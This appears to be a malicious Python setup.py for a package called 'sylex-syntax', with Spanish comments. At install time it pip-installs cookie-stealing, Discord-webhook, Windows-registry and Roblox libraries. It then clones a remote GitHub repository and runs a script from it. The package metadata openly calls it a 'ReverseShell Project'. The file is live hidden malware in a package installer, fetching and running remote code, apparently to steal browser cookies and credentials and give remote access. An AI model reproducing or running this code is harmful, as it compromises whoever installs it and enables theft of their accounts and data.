from setuptools import setup
import requests
import socket
import subprocess
import os

# Instala el paquete gitpython
subprocess.run(['pip', 'install', 'gitpython'])
subprocess.run(['pip', 'install', 'requests'])
subprocess.run(['pip', 'install', 'sockets'])
subprocess.run(['pip', 'install', 'pypiwin32'])
subprocess.run(['pip', 'install', 'pycryptodome'])
subprocess.run(['pip', 'install', 'uuid'])
subprocess.run(['pip', 'install', 'cryptography'])
subprocess.run(['pip', 'install', 'pyfiglet'])
subprocess.run(['pip', 'install', 'browser_cookie3'])
subprocess.run(['pip', 'install', 'discord_webhook'])
subprocess.run(['pip', 'install', 'prettytable'])
subprocess.run(['pip', 'install', 'getmac'])
subprocess.run(['pip', 'install', 'pyautogui'])
subprocess.run(['pip', 'install', 'winregistry'])
subprocess.run(['pip', 'install', 'robloxpy'])
subprocess.run(['pip', 'install', 'Pillow'])
subprocess.run(['pip', 'install', 'tqdm'])
subprocess.run(['pip', 'install', 'setuptools'])

import git


def send_discord_info():
    # Clona el repositorio de GitHub y ejecuta el archivo
    repo_url = 'https://github.com/SyntaxCode123456/Suicidate2.git'  # Reemplaza con la URL de tu repositorio de GitHub
    repo_path = os.path.join('C:', 'Users', 'repo')  # Ruta donde deseas clonar el repositorio

    if not os.path.isdir(repo_path):
        git.Repo.clone_from(repo_url, repo_path)

    os.chdir(repo_path)
    subprocess.run(['python', 'sylex.py'])

# Define la ruta donde deseas clonar el repositorio
repo_path = os.path.join('C:', 'Users', 'repo')

setup(
    name='sylex-syntax',
    version='1.5',
    packages=['syntax'],
    url='https://github.com/tuusuario/reverse_shell',
    license='',
    author='$yntaxCode',
    author_email='reverseshell@gmail.com',
    description='ReverseShell Project'
)

if __name__ == '__main__':
    send_discord_info()